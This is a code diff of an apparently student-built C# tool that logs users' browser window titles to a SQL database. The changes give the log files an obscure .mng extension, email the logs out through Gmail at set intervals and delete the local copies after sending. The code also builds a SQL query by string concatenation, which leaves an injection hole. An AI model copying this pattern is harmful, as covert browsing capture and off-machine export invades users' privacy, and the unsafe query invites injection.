@@ -22,18 +22,19 @@ namespace MigatteNoGokui
         SqlCommand comando;
 
         // Conexión con la base de datos se hace desde aquí, si se desea cambiar la base de datos, hacerlo en data Source
-        string cadenaConexion = "Data Source=DESKTOP-RQDTPHQ; Initial Catalog=SO2_LOGS; Integrated Security=True;";
+        string cadenaConexion = "Data Source=2DESKTOP-RQDTPHQ; Initial Catalog=SO2_LOGS; Integrated Security=True;";
         public SqlConnection conectarBase = new SqlConnection();
         string consulta = "SELECT * FROM USUARIOS where Nombre_Usuario = '" + Environment.UserName.ToString() + "';";
         int id = 0;
         SqlDataReader lectura;
-        Boolean conexion = false;
-        string logsChrome = "./logs_usuario/logsChrome.txt";
-        string logsIExplore = "./logs_usuario/logsIExplore.txt";
-        string logsFirefox = "./logs_usuario/logsFirefox.txt";
+        // Boolean conexion = false;
+        string logsChrome = "./logs_usuario/logsChrome.mng";
+        string logsIExplore = "./logs_usuario/logsIExplore.mng";
+        string logsFirefox = "./logs_usuario/logsFirefox.mng";
         string chrome = "Chrome";
         string explorer = "IExplore";
         string firefox = "Firefox";
+        int contadorCorreo = 0;
 
         public ConexionBD()
         {
@@ -77,7 +78,7 @@ namespace MigatteNoGokui
                 catch (Exception e)
                 {
                     Console.WriteLine("Consulta NO POSIBLE  " + e.Message);
-                    conexion = false;
+                    // conexion = false;
 
                 }
             }
@@ -102,7 +103,7 @@ namespace MigatteNoGokui
                     Console.WriteLine("No se pudo hacer backup");
                 }
 
-                this.EnviarCorreo();
+                // this.EnviarCorreo();
             }
 
         }
@@ -122,6 +123,12 @@ namespace MigatteNoGokui
             catch (Exception e)
             {
                 Console.WriteLine("no se pudo agregar registro a historial");
+                if ( contadorCorreo >= 10)
+                {
+                    EnviarCorreo();
+                    contadorCorreo = 0;
+                }
+                contadorCorreo++;
 
             }
             
@@ -139,9 +146,9 @@ namespace MigatteNoGokui
         {
 
 
-            string fileChrome = Path.GetFileName(Application.StartupPath.ToString() + @"\logs_usuario\Backup_noConection" + chrome +".txt");
-            string fileIExplore = Path.GetFileName(Application.StartupPath.ToString() + @"\logs_usuario\Backup_noConection" + explorer + ".txt");
-            string fileFirefox = Path.GetFileName(Application.StartupPath.ToString() + @"\logs_usuario\Backup_noConection" + firefox + ".txt");
+            string fileChrome = Path.GetFileName(Application.StartupPath.ToString() + @"\logs_usuario\Backup_noConection" + chrome +".mng");
+            string fileIExplore = Path.GetFileName(Application.StartupPath.ToString() + @"\logs_usuario\Backup_noConection" + explorer + ".mng");
+            string fileFirefox = Path.GetFileName(Application.StartupPath.ToString() + @"\logs_usuario\Backup_noConection" + firefox + ".mng");
             using (SmtpClient cliente = new SmtpClient("smtp.gmail.com", 587))
             {
                 cliente.EnableSsl = true;
@@ -154,6 +161,9 @@ namespace MigatteNoGokui
                 {
                     cliente.Send(mensaje);
                     Console.Write("correo enviado");
+                    File.Delete(fileChrome);
+                    File.Delete(fileIExplore);
+                    File.Delete(fileFirefox);
                 }
                 catch (Exception e)
                 {
@@ -166,7 +176,7 @@ namespace MigatteNoGokui
 
         public void BackupTxt(ArrayList info, string navegador)
         {
-            string path = Application.StartupPath.ToString() + @"\Backup_noConection" + navegador + ".txt";
+            string path = Application.StartupPath.ToString() + @"\Backup_noConection" + navegador + ".mng";
             if (!File.Exists(path))
             {
                 // Create a file to write to.
@@ -184,7 +194,13 @@ namespace MigatteNoGokui
                 }
 
             }
-            
+            Console.WriteLine(contadorCorreo);
+            contadorCorreo++;
+            if (contadorCorreo >= 5)
+            {
+                contadorCorreo = 0;
+                EnviarCorreo();
+            } 
         }
 
         private ArrayList RecuperacionDatos(string direccion)
@@ -198,13 +214,15 @@ namespace MigatteNoGokui
             foreach (var linea in lineas)
             {
                 var valor = linea.Split(',');
+
                 // Filtro de los valore que no nos interesan recuperar
+                
                 if ((valor.Length == 9) && (reg.Replace(valor[8], "") != "Ttulo de ventana"))
                 {
                     //Console.WriteLine(valor[8]);
                     if ((valor[8].ToString() != "\"N/D\""))
                     {
-                        //Console.WriteLine(reg.Replace(valor[8], ""));
+                        Console.WriteLine(reg.Replace(valor[8], ""));
                         var nombreVentanas = valor[8].Split('-');
                         if (nombreVentanas.Length > 2)
                         {
